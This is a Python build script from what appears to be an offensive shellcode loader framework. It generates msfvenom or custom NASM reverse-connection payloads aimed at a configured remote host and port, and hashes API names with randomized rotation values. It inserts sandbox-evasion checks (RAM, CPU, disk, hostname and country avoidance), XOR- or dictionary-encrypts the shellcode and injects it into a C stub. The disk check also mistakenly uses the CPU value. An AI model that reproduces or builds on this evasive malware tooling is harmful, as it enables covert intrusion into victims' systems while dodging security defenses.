from configparser import ConfigParser
from scripts.hasher import hash
from scripts.config import parse_config
from scripts.templating import *
from scripts.dict import dictionary_encrypt
from scripts.utils import *
from scripts.c2 import *
import random
import sys

config = ConfigParser()
config.read(".conf") 

# CONFIG = parse_config(config)

def is_set(value):
    return value != None and value != ""

ENCRYPTION_METHOD = config.get("Payload", "encryption_method")
TARGET_PROCESS = config.get("Payload", "target_process")

STUB_FILE = config.get("Stub", "filename")
PRIORIZE_SIZE = config.getboolean("Stub", "priorize_size")

DISK_SIZE = config.get("Anti-Analysis", "disk_size")
RAM_SIZE = config.get("Anti-Analysis", "ram_size")
CPU_COUNT = config.get("Anti-Analysis", "cpu_cores")

TARGET_HOSTNAME = config.get("Anti-Analysis", "target_hostname")

AVOID_HOSTNAME = config.get("Anti-Analysis", "avoid_hostname").split(",")
if len(AVOID_HOSTNAME) <= 1 and AVOID_HOSTNAME[0] == "":
    AVOID_HOSTNAME = []

AVOID_COUNTRIES = config.get("Anti-Analysis", "avoid_countries").split(",")
if len(AVOID_COUNTRIES) <= 1 and AVOID_COUNTRIES[0] == "":
    AVOID_COUNTRIES = []

WORKING_FOLDER = "build/"


def main():
    if config.get("Payload", "encryption_key") == "random":
        ENCRYPTION_KEY = generate_high_entropy_int(0x1111, 0xFFFF)
    else:
        ENCRYPTION_KEY = int(config.get("Payload", "encryption_key"),16)


    RHOST = config.get("Payload", "rhost") if is_set(config.get("Payload", "rhost")) else None
    RPORT = config.getint("Payload", "rport") if is_set(config.get("Payload", "rport")) else None
    RURI = config.get("Payload", "ruri") if is_set(config.get("Payload", "ruri")) else None

    if PRIORIZE_SIZE:
        # no stdlib
        sed_files(WORKING_FOLDER, "int WinMain(", "int WinMainCRTStartup(")
        sed_files(WORKING_FOLDER, "strlen(", "custom_strlen(",[".c"])
        sed_files(WORKING_FOLDER, "strcmp(", "custom_strcmp(",[".c"])
        sed_files(WORKING_FOLDER, "strncpy(", "custom_strncpy(",[".c"])
        sed_files(WORKING_FOLDER, "srand((", "// srand(")
        sed_files(WORKING_FOLDER, "rand()", f"{random.randint(0, 0xFFFF)}")
        sed_files(WORKING_FOLDER, "printf(", "// printf(")



    if is_set(config.get("Payload", "name")):
        PAYLOAD_NAME = config.get("Payload", "name")
        if ".asm" in PAYLOAD_NAME or ".nasm" in PAYLOAD_NAME:
            ROR_VALUE = random.choice([13,17,19,21,23])
            sed_file(WORKING_FOLDER+PAYLOAD_NAME, "%ROR_VALUE%", hex(ROR_VALUE))
            sed_file(WORKING_FOLDER+PAYLOAD_NAME, "%LHOST__LPORT%", format_lhost_lport(RHOST,RPORT))
            remaining_tags = extract_tags_from_file(WORKING_FOLDER+PAYLOAD_NAME)

            # Tags like %HASH_MODULE_FUNCTION% are replaced by their hash
            for tag in remaining_tags:
                parts = tag.replace("%", "").split("__")
                if parts[0] == "HASH":
                    sed_file(WORKING_FOLDER+PAYLOAD_NAME, tag, hex(hash(parts[1], parts[2], ROR_VALUE)))
                if parts[0] == "RANDOM":
                    # Générer une valeur aléatoire de 32 bits
                    dword_value = random.randint(0, 0xFFFFFFF)
                    sed_file(WORKING_FOLDER+PAYLOAD_NAME, tag, hex(dword_value))
            instructions = nasm2instructions(WORKING_FOLDER+PAYLOAD_NAME)
            with open("build/payload.txt", "w") as f:
                f.write(str(instructions))
        else:
 
            msfvenom(PAYLOAD_NAME, RHOST, RPORT, RURI)
        PAYLOAD_FILE = "payload.txt"
    else:
        print("No payload file or payload name specified")
        sys.exit(1)

    print("===========CONFIG==========")
    # print(f"Encryption byte: {hex(ENCRYPTION_KEY)}")
    print(f"Payload : {PAYLOAD_FILE} {PAYLOAD_NAME}")
    print(f"RHOST : {RHOST}")
    print(f"RPORT : {RPORT}")
    print("===========================\n")

    print("===========PAYLOAD==============")


    all_tags = extract_tags_from_folder(WORKING_FOLDER)

    for file in all_tags:
        filename = file["filename"]
        tags = file["tags"]
        # print(f"Processing {filename} with tags {tags}")
        # Tags like %HASH__MODULE__FUNCTION% are replaced by their hash
        if "anti" in filename:
            print(f"Processing {filename} with tags {tags}")
        for tag in tags:
            parts = tag.replace("%", "").split("__")
            if parts[0] == "MODHASH": # definitions.c
                sed_file(WORKING_FOLDER+filename, tag, hash_obj(parts[1],""))
            if parts[0] == "FCTHASH": # definitions.c
                if parts[1] == "target_process":
                    sed_file(WORKING_FOLDER+filename, tag, hash_obj("", TARGET_PROCESS))
                else:
                    sed_file(WORKING_FOLDER+filename, tag, hash_obj("", parts[1]))
            if parts[0] == "SANDBOX":
                if parts[1] == "RAM_CHECK":
                    print("RAM_CHECK")
                    if is_set(RAM_SIZE):
                        template = get_template("RAM_CHECK")
                        sed_file(WORKING_FOLDER+filename, tag, template.replace("%VALUE%", RAM_SIZE))
                    else:
                        sed_file(WORKING_FOLDER+filename, tag, "")
                if parts[1] == "CPU_CHECK":
                    if is_set(CPU_COUNT):
                        template = get_template("CPU_CHECK")
                        sed_file(WORKING_FOLDER+filename, tag, template.replace("%VALUE%", CPU_COUNT))
                    else:
                        sed_file(WORKING_FOLDER+filename, tag, "")
                if parts[1] == "DISK_CHECK":
                    if is_set(CPU_COUNT):
                        template = get_template("DISK_CHECK")
                        sed_file(WORKING_FOLDER+filename, tag, template.replace("%VALUE%", CPU_COUNT))
                    else:
                        sed_file(WORKING_FOLDER+filename, tag, "")
                if parts[1] == "COUNTRY_CHECK":
                    if len(AVOID_COUNTRIES):
                        template = get_template("COUNTRY_CHECK")
                        sed_file(WORKING_FOLDER+filename, tag, template)
                    else:
                        sed_file(WORKING_FOLDER+filename, tag, "")

                # ------OLD----------
                if parts[1] == "DISKSIZE":
                    sed_file(WORKING_FOLDER+filename, tag, DISK_SIZE)
                if parts[1] == "TARGET_HOSTNAME":
                    if len(TARGET_HOSTNAME):
                        sed_file(WORKING_FOLDER+filename, tag, hash_obj("",TARGET_HOSTNAME))
                        print("Target hostname: ", TARGET_HOSTNAME)
                    else:
                        sed_file(WORKING_FOLDER+filename, tag, "{0, 0, false}")
                if parts[1] == "AVOID_HOSTNAME":
                    if len(AVOID_HOSTNAME):
                        res = ""
                        for hostname in AVOID_HOSTNAME:
                            if hostname != "":
                                res += hash_obj("",hostname)+","
                        sed_file(WORKING_FOLDER+filename, tag, res[:-1])
                        print("Avoid hostnames: ", AVOID_HOSTNAME)
                    else:
                        sed_file(WORKING_FOLDER+filename, tag, "") # {0, 0, false}
                if parts[1] == "AVOID_COUNTRIES":
                    if len(AVOID_COUNTRIES):
                        res = ""
                        for country in AVOID_COUNTRIES:
                            if country != "":
                                ids = get_LCID(country)
                                for id in ids:
                                    res += str(hex(id))+","
                        sed_file(WORKING_FOLDER+filename, tag, res[:-1])
                        print("Avoid countriess: ", AVOID_COUNTRIES)
                    else:
                        sed_file(WORKING_FOLDER+filename, tag, "") # {0, 0, false}


    if PAYLOAD_FILE.endswith(".bin") or PAYLOAD_FILE.endswith(".raw"):
        instructions = bin2instructions(WORKING_FOLDER+PAYLOAD_NAME)
    elif PAYLOAD_FILE.endswith(".txt"):
        instructions = txt2instructions(WORKING_FOLDER+"payload.txt")
    else:
        print(f"Unknown file format of the payload : {PAYLOAD_FILE}")
        sys.exit(1)

    print("================================\n")



    # Encrypt the shellcode
    print("===========ENCRYPTION==============")
    
    if ENCRYPTION_METHOD == "dictionary" or ENCRYPTION_METHOD == "dict":
        print(f"\nEncrypted with dictionary\n")
        instructions, association_table, size_payload_phrase = dictionary_encrypt(instructions)

        sed_file("build/definitions.h", "%PAYLOAD_SIZE%", str(round_pow2(size_payload_phrase)))
        sed_file("build/payload.c", "%SHELLCODE%", f"unsigned char payload[];\n\n{association_table}\n\nconst char* dict_payload = {instructions};")
        sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE_DECODER%", "DICT_decrypt(dict_payload);")
    
    else:
        print(instructions[:32]+"...")
        print(f"\nEncrypted with '{hex(ENCRYPTION_KEY)}' {int(len(instructions)/2)} bytes of instructions\n")
        encrypted_instructions = xor2_encrypt_decrypt(instructions, ENCRYPTION_KEY)
        print(encrypted_instructions[:32]+"...")

        sed_file("build/definitions.h", "%PAYLOAD_SIZE%", str(int(len(instructions)/2)))
        sed_file("build/payload.c", "%SHELLCODE%", f"unsigned char payload[] = \"{format_instructions(encrypted_instructions)}\";")
        sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE_DECODER%", "XOR(payload,sizeof(payload),key);")
    
    print("===================================\n")
    sed_file(WORKING_FOLDER+STUB_FILE, "%XOR_KEY%", str(ENCRYPTION_KEY))

    

    print("\n================COMPILATION===============")


if __name__ == "__main__":
    main()